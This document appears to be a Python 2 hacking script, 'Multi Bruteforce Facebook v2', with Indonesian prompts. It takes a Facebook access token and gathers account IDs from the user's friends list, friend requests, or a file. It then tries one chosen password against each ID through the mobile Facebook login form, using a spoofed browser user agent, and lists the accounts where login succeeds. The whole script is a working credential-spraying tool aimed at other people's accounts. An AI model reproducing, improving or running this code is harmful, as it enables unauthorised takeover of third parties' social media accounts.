# coding: utf8
import sys
try:
	import os,time,mechanize,json,requests
	import urllib2,time,cookielib
except ImportError as e:
	print "\033[1;31mSepertinya Ada Module Yang Belum Terinstall"
	print "\033[1;33m"+str(e)
	sys.exit()
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
LINE="%s————————————————————————"%(R)
def hard(text): 
	print "%s[%s!%s] %s%s"%(C,R,C,W,text)
	return "%s[%s!%s] %s%s"%(C,R,C,W,text)
def medium(text): 
	print "%s[%s!%s] %s%s"%(C,Y,C,W,text)
	return "%s[%s!%s] %s%s"%(C,Y,C,W,text)
def easy(text): 
	print "%s[%s!%s] %s%s"%(C,G,C,W,text)
	return "%s[%s!%s] %s%s"%(C,G,C,W,text)
def brute(daftar,sandi):
	berhasil=[]
	for id in daftar:
		mech=mechanize.Browser()
		mech.set_handle_robots(False)
		mech.set_handle_redirect(True)
		mech.set_handle_referer(True)
		mech.set_handle_equiv(True)
		mech.set_cookiejar(cookielib.LWPCookieJar())
		mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
		mech.open("https://m.facebook.com")
		mech.select_form(nr=0)
		mech.form["email"]=id
		mech.form["pass"]=sandi
		mech.submit()
		if "save-device" in mech.geturl() or "m_sess" in mech.geturl():
			berhasil.append(id)
	return berhasil
################
if os.path.isfile("MBF2.json"):
	easy("File Exists With Data: %sMBF2.json"%(Y))
else:
	token=raw_input("%s[%s?%s] %sEnter Valid Facebook Access Token: %s"%(G,Y,G,C,W))
	fp=open("MBF2.json","w+")
	dat="""
{
	"user_token": "%s"
}
"""%(token)
	fp.write(dat)
	fp.close()
	easy("File SuccessFully Created. Exiting....")
	sys.exit()
###############
token=json.loads(open("MBF2.json","r").read())["user_token"]
nama=requests.get("https://graph.facebook.com/me?access_token="+token)
print """%s+------------------------------+%s
|%s Multi %sBruteforce %sFacebook %sv2 |
%s+------------------------------+"""%(W,C,R,Y,G,C,W)
print LINE
medium("Dibuat Oleh @HeroBrinePE.")
try:
	easy("Selamat Datang: "+json.loads(nama.text)["name"])
except KeyError:
	hard("Token Anda Salah Ulangi Lagi")
	os.remove("MBF2.json")
	sys.exit()
print LINE
print "%s[%s1%s] %sHapus Token Facebook Pengguna"%(G,C,G,W)
print "%s[%s2%s] %sAmbil ID Dari Daftar Teman"%(G,C,G,W)
print "%s[%s3%s] %sAmbil ID Dari Daftar Request Pertemanan"%(G,C,G,W)
print "%s[%s4%s] %sAmbil ID Dari File"%(G,C,G,W)
raw=raw_input("%s>>> %s"%(G,W))
if raw=="1":
	easy("Menghapus File...")
	time.sleep(1)
	medium("Selesai...")
	os.remove("MBF2.json")
	sys.exit()
elif raw=="2":
	sid=raw_input("%sMenggunakan Sandi: %s"%(Y,W))
	stacks=[]
	data=requests.get("https://graph.facebook.com/me?fields=friends.limit(5000)&access_token="+token)
	JSON=json.loads(data.text)
	medium("Sedang Mengambil ID Teman...")
	for i in JSON["friends"]["data"]:
		stacks.append(i["id"])
		time.sleep(0.4)
	easy("Memulai Dengan %s%i%s Akun"%(G,len(stacks),W))
	hasil=brute(stacks,sid)
	for z in hasil:
		hard("%s -> %s"%(M+z,C+sid))
	medium("Selesai...")
	sys.exit()
elif raw=="3":
	sid=raw_input("%sMenggunakan Sandi: %s"%(Y,W))
	stacks=[]
	data=requests.get("https://graph.facebook.com/me/friendrequests?limit=50&access_token="+token)
	JSON=json.loads(data.text)
	medium("Sedang Mengambil ID Request Pertemanan...")
	for i in JSON["data"]:
		stacks.append(i["from"]["id"])
		time.sleep(0.4)
	easy("Memulai Dengan %s%i%s Akun"%(G,len(stacks),W))
	hasil=brute(stacks,sid)
	for z in hasil:
		hard("%s -> %s"%(M+z,C+sid))
	medium("Selesai...")
	sys.exit()
elif raw=="4":
	sid=raw_input("%sMenggunakan Sandi: %s"%(Y,W))
	FILE=open(raw_input("%sLokasi Daftar File: %s"%(C,W))).read()
	easy("Memulai Dengan %s%i%s Akun"%(G,len(FILE.split("\n")),W))
	print FILE.split("\n")
	hasil=brute(FILE.split("\n"),sid)
	for z in hasil:
		hard("%s -> %s"%(M+z,C+sid))
	medium("Selesai...")
	sys.exit()
else:
  python = sys.executable
  os.execl(python, python, * sys.argv)
  curdir = os.getcwd()